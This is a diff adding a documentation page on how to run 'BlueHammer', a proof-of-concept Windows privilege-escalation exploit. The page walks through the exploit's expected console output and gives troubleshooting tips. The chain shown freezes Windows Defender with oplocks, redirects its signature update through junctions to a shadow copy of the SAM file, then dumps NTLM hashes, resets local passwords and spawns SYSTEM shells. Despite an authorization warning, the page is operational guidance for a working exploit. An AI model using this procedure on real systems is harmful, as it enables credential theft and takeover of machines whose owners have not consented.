@@ -1,0 +1,140 @@
+---
+title: "Running"
+description: "How to execute BlueHammer and interpret its console output."
+---
+
+<Warning>
+  Only run BlueHammer on systems you own or have explicit written authorization to test. The PoC temporarily modifies local user account passwords during execution.
+</Warning>
+
+## Execution
+
+Run the compiled binary from a Command Prompt. **Do not run as Administrator or SYSTEM** — the PoC is designed to execute as a standard user and escalates privileges internally.
+
+```bash
+x64\Release\FunnyApp.exe
+```
+
+The binary checks whether it is already running as SYSTEM via `IsRunningAsLocalSystem()`. If it detects SYSTEM context (which happens when the transient service launches the binary in stage 4), it accepts a session ID argument and spawns a console in that session instead of running the exploit:
+
+```bash
+# This form is invoked automatically by the transient service — not manually
+FunnyApp.exe <sessionId>
+```
+
+## Console output walkthrough
+
+The following is the expected sequence of output lines and what each means:
+
+```
+Checking for windows defender signature updates...
+```
+Polling the Windows Update Agent COM API for a pending Definition Update for Microsoft Defender Antivirus. Retries every 30 seconds if none is found.
+
+```
+Found Update : 
+Security Intelligence Update for Microsoft Defender Antivirus - ...
+```
+A qualifying update was found. Execution proceeds to download.
+
+```
+Downloading updates...
+Done.
+Cabinet file mapped at 0x000001A23B4C0000
+Extracting cab file content...
+Cab file content extracted.
+```
+The update installer EXE is downloaded from `go.microsoft.com`, the embedded cabinet file is located in its `.rsrc` section, and the update files (including `mpasbase.vdm`) are extracted in memory.
+
+```
+Creating VSS copy...
+Found N volume shadow copies
+Waiting for callback...
+```
+An EICAR test file is written to trigger Windows Defender scanning. The Cloud Files sync root is registered. The PoC waits for WD to query the sync root directory.
+
+```
+Defender flagged.
+Waiting for oplock to trigger...
+WD is frozen and the new VSS can be used.
+New volume shadow copy detected : \Device\HarddiskVolumeShadowCopyN
+Successfully accessed volume shadow copy.
+```
+WD's directory query triggered the Cloud Files callback. A batch oplock on the `.lock` placeholder freezes WD's I/O. A new VSS volume was detected and confirmed accessible.
+
+```
+Calling ServerMpUpdateEngineSignature...
+Waiting for windows defender to create a new definition update directory...
+Detected new definition update directory in C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{GUID}
+```
+The WD RPC call is in progress. WD creates a new definition update directory as it begins processing the attacker-supplied update path.
+
+```
+Setting oplock on \\?\...\mpasbase.vdm
+Waiting for oplock to trigger...
+oplock triggered !
+File moved ...
+Directory moved ...
+Recreated ...
+Junction created ... => \BaseNamedObjects\Restricted
+Object manager link created \BaseNamedObjects\Restricted\mpasbase.vdm => \Device\HarddiskVolumeShadowCopyN\Windows\System32\Config\SAM
+```
+The file redirection chain is now in place. WD will follow the junction and symlink when it resumes.
+
+```
+Leaked file opened C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{GUID}\mpasbase.vdm
+Read 262144 bytes
+Exploit succeeded.
+SAM file written at : C:\Users\...\AppData\Local\Temp\{UUID}
+```
+WD read the SAM file. The PoC has a copy saved to `%TEMP%`.
+
+```
+******************************************
+    User : Administrator
+    RID : 500
+    NTLM : aad3b435b51404eeaad3b435b51404ee
+    Skip : NULL NTLM.
+******************************************
+    User : Alice
+    RID : 1001
+    NTLM : 8846f7eaee8fb117ad06bdd830b7586c
+    NewPasswordSet : OK.
+    IsAdmin : TRUE
+    SYSTEMShell : OK.
+    Shell : OK.
+    PasswordRestore : OK.
+******************************************
+```
+For each local user account (except the current user and `WDAGUtilityAccount`): the decrypted NTLM hash is printed, a shell is launched, and the password is restored.
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="RPC call fails with 0x8050A003">
+    This error means the update package that was downloaded does not match the type the RPC call expects. The comment in source says: *"PoC might fail here with 0x8050A003 from time to time, this means the update that the PoC is attempting to perform isn't the right one for this code, bail out anyway and wait for the right update."*
+
+    Wait for a fresh Definition Update to become available and run the PoC again.
+  </Accordion>
+
+  <Accordion title="No updates found / retrying every 30 seconds">
+    Windows Update must have a pending Definition Update for Microsoft Defender Antivirus. Try:
+    - Open **Windows Update → Check for updates** to force a check
+    - Verify internet connectivity to `go.microsoft.com`
+    - Ensure the `wuauserv` (Windows Update) service is running
+  </Accordion>
+
+  <Accordion title="VSS creation or WD freeze fails">
+    - Confirm the Volume Shadow Copy Service (`VSS`) is running: `sc query vss`
+    - Confirm Windows Defender is active: `sc query WinDefend`
+    - Running in a VM can affect timing; retry on bare metal or increase VM resources
+  </Accordion>
+
+  <Accordion title="PasswordRestore: Error">
+    The user's password was changed but could not be restored. Manually reset the affected account password via **Computer Management → Local Users and Groups** or `net user <username> <newpassword>`.
+  </Accordion>
+
+  <Accordion title="CoCreateInstance returns NULL / COM errors">
+    The Windows Update Agent COM server must be accessible. Ensure `wuauserv` is running and not blocked by Group Policy. The PoC calls `CoInitialize(NULL)` — if COM initialization fails, it exits immediately.
+  </Accordion>
+</AccordionGroup>
